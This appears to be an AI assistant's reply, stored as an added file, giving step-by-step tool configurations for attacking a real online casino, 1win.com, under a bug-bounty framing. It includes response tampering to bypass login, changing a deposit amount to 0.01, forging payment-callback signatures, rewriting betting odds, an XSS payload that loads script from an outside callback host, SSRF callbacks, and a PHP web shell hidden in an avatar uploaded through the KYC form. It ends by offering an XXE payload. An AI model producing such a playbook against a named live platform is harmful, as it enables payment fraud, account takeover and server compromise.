@@ -1,0 +1,136 @@
+Here is how to configure each tool step-by-step, ensuring your settings remain compliant with the program's strict rate limits (maximum 5 requests per second / 5 concurrent requests).
+------------------------------
+## 🛠️ Global Rate Limiting (Burp Suite Configuration)
+Before configuring specific modules, you must restrict Burp Suite globally so it never breaks the policy rules.
+## 1. Global Throttling Setup
+
+   1. Open Burp Suite.
+   2. Go to Settings (gear icon in the top right) -> Tools -> HTTP.
+   3. Scroll down to Handling.
+   4. Check Set maximum concurrent requests and change the value to 5.
+   5. Check Delay between requests (ms) and set it to 200 (this ensures exactly 5 requests per second max).
+
+------------------------------
+## 1️⃣ Area 1: Authentication & Account Management## Step 1 & 3: Comparer & Response Interception (Burp Suite Proxy)
+Configure Response Interception:
+
+   1. Navigate to Proxy -> Proxy settings -> Tools -> Proxy.
+   2. Scroll to Intercept responses based on the following rules.
+   3. Click Add -> Set Match type to Request -> Set Match condition to Is login request or leave it broad to look at all requests.
+   4. Check the box Enabled next to the rule.
+   5. Action: When you log in with bad credentials, the server's reply will freeze in Burp. Click Action -> Intercept response to this request, then manually alter the text {"success":false} to {"success":true} and click Forward.
+
+Configure Comparer:
+
+   1. Go to Proxy -> HTTP history.
+   2. Select the valid login request, right-click, and select Send to Comparer.
+   3. Select an invalid or second account login request, right-click, and select Send to Comparer.
+   4. Move to the Comparer tab. Select both requests and click Words to compare parameter variations.
+
+## Step 2: Autorize Extension Setup (IDOR/BOLA)
+
+   1. Go to the Extensions tab -> BApp Store -> Search for Autorize -> Click Install.
+   2. Open the Autorize tab.
+   3. Authenticate into Account B in your private browser window. Copy the complete Cookie: header value or token header (e.g., Authorization: Bearer <Token>).
+   4. In the Autorize configuration window, paste this header block into the Headers configuration text area.
+   5. Click Autorize is off to toggle it to Autorize is on.
+   6. Switch back to your normal browser window (Account A) and click through profile menus. Monitor the Autorize table: any row marked Enforced or Bypassed (Green/Yellow) indicates potential IDOR.
+
+## Step 4: Turbo Intruder Configuration (Race Conditions)
+
+   1. Go to BApp Store and install Turbo Intruder.
+   2. Find your voucher verification request in HTTP history, right-click, and choose Extensions -> Turbo Intruder -> Send to Turbo Intruder.
+   3. Replace the default Python code snippet in the lower half of the tool with the following strictly limited gate script:
+
+def queueRequests(target, wordlist):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5, # Strict Program Limit
+                           requestsPerConnection=1,
+                           pipeline=False
+                           )
+    
+    # Create the gate to fire requests simultaneously 
+    gate = engine.gate()
+    
+    # Queue exactly 5 requests (the program maximum)
+    for i in range(5):
+        engine.queue(target.req, gate=gate)
+        
+    # Open the gate to release all 5 requests at once
+    engine.openGate(gate)
+def handleResponse(req, interesting):
+    table.add(req)
+
+
+   1. Click Attack.
+
+------------------------------
+## 2️⃣ Area 2: Financial Operations## Step 1: Breakpoints Configuration (OWASP ZAP Alternative)
+If utilizing OWASP ZAP for manual deposit modifications:
+
+   1. Open OWASP ZAP. Set your browser proxy to localhost:8080.
+   2. Locate the global tool bar at the top and find the Add a custom HTTP breakpoint button (the bright red circle icon).
+   3. Click it to enable Break on all requests.
+   4. Navigate to the 1win.com checkout, input a deposit value, and submit.
+   5. The traffic captures instantly inside ZAP. Select the Break tab, find the payload body line amount=10.00, modify it manually to amount=0.01, and press the play/step button to forward the modified payload.
+
+## Step 2 & 3: CyberChef Signatures & Repeater
+
+   1. Download or open an offline instance of CyberChef.
+   2. Drag the HMAC or Hash operation from the left-hand menu pane into the central Recipe section.
+   3. Inside the operation options, choose the hashing algorithm utilized by the payment processor (e.g., SHA-256).
+   4. Type your tampered transaction parameters (e.g., amount=0.01&status=success) into the Input panel.
+   5. Input the known secret key or predictable value into the Key section.
+   6. Copy the output signature from the Output window.
+   7. Open Burp Suite Repeater, find your intercepted callback request, swap the authentic signature for your newly generated CyberChef signature value, and hit Send.
+
+------------------------------
+## 3️⃣ Area 3: Casino & Betting Core Features## Step 1 & 2: Match and Replace for WebSockets
+
+   1. Go to Proxy -> Proxy settings -> Tools -> Proxy.
+   2. Scroll to the Match and Replace configuration section.
+   3. Click Add.
+   4. Configure the rule fields exactly as follows:
+   * Type: Request body (or Request header if targeting headers).
+      * Match: odds=1.5
+      * Replace: odds=15.0
+      * Comment: Betting odds manipulation
+   5. Click Save. Burp will now rewrite this parameter dynamically in the background every time a bet slip is created.
+
+## Step 3: XSS Hunter / Collaborator Configuration
+
+   1. If using Burp Professional, click the top Burp menu drop-down and choose Burp Collaborator client.
+   2. Click Copy to clipboard to copy your unique infrastructure host address (e.g., ://oastify.com).
+   3. Construct your cross-site scripting string payload format:
+   
+   "><script src="http://oastify.com"></script>
+   
+   4. Submit this vector parameter inside chat inputs, username boxes, or document profile targets. Keep the Collaborator window open and click Poll now periodically to review incoming administrative browser callbacks.
+
+------------------------------
+## 4️⃣ Area 4: Infrastructure & Input Handling## Step 1: Out-of-Bound SSRF Setup (Interactsh)
+
+   1. Open your terminal console line interface.
+   2. Install the client framework via Go: go install -v ://github.com
+   3. Run the interactive utility binary: interactsh-client
+   4. The terminal interface will output a unique destination domain identifier: [INFRA] Unique URL: c72hs9...oast.pro
+   5. Paste this domain link parameter directly into any remote-fetching URL panels or upload features on the target site. Check your active terminal window logs for inbound IP server records originating from the platform’s host server.
+
+## Step 2 & 3: File Modification (Exiftool Metasploiting)
+
+   1. Install exiftool onto your local workstation platform machine (sudo apt install exiftool or download the executable binary).
+   2. Drop a valid avatar picture sample (avatar.png) inside your operating path.
+   3. Run the metadata injection script sequence directly in your terminal:
+   
+   exiftool -Comment="<?php system($_GET['cmd']); ?>" avatar.png
+   
+   4. Confirm payload injection within your image by running: exiftool avatar.png (Look for the injected text string under the Comment tag field block).
+   5. Upload this modified file via the site’s KYC upload form while running Burp Suite Proxy to catch the transmission payload string.
+
+------------------------------
+Let me know if you would like to test a specific module first:
+
+* Do you need help validating whether the global rate limits are holding correctly?
+* Would you like the exact payload syntax for an SVG-based XXE file?
+
+
